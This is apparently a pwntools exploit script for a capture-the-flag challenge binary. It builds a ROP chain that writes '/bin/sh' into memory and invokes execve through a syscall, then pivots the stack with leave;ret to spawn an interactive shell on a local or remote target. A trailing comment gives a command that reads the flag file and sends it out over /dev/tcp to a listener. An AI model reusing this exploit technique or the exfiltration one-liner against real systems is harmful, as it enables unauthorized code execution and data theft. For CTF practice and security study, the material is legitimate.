from pwn import *
import sys
import time

context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"


def one_gadget(filename: str) -> list:
    return [
        int(i)
        for i in __import__("subprocess")
        .check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


# brva x = b *(pie+x)
# set follow-fork-mode
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s = lambda data: r.send(data)
sa = lambda x, y: r.sendafter(x, y)
sl = lambda data: r.sendline(data)
sla = lambda x, y: r.sendlineafter(x, y)
ru = lambda delims, drop=True: r.recvuntil(delims, drop)
uu32 = lambda data, num: u32(r.recvuntil(data)[-num:].ljust(4, b"\x00"))
uu64 = lambda data, num: u64(r.recvuntil(data)[-num:].ljust(8, b"\x00"))
leak = lambda name, addr: log.success("{} = {}".format(name, addr))
l64 = lambda: u64(r.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
l32 = lambda: u32(r.recvuntil("\xf7")[-4:].ljust(4, b"\x00"))

# execve("/bin/sh", argv, envp)
# syscall number  = rax = 0x3b
# rdi = "/bin/sh" (pointer to "/bin/sh")
# rsi = 0 or pointer to 0
# rdx = 0 or pointer to 0

from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000000000000ba30) # 0x000000000040ba30: pop r13; ret;
rop += b'/bin/sh\x00'
rop += rebase_0(0x0000000000001950) # 0x0000000000401950: pop rbx; ret;
rop += rebase_0(0x00000000000c5000)
rop += rebase_0(0x000000000006b182) # 0x000000000046b182: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000ba30) # 0x000000000040ba30: pop r13; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000001950) # 0x0000000000401950: pop rbx; ret;
rop += rebase_0(0x00000000000c5008)
rop += rebase_0(0x000000000006b182) # 0x000000000046b182: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000001f1f) # 0x0000000000401f1f: pop rdi; ret;
rop += rebase_0(0x00000000000c5000)
rop += rebase_0(0x0000000000009f8e) # 0x0000000000409f8e: pop rsi; ret;
rop += rebase_0(0x00000000000c5008)
rop += rebase_0(0x0000000000085ccb) # 0x0000000000485ccb: pop rdx; pop rbx; ret;
rop += rebase_0(0x00000000000c5008)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000004ff47) # 0x000000000044ff47: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000001aa06) # 0x000000000041aa06: syscall; ret;
sa("?",rop)
leave_ret = 0x0000000000401877
name = 0x4c7220
sa(":",b'A' * 32 + p64(name - 8) + p64(leave_ret))
r.interactive()

"""
Writeup:
"""


"""
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
"""
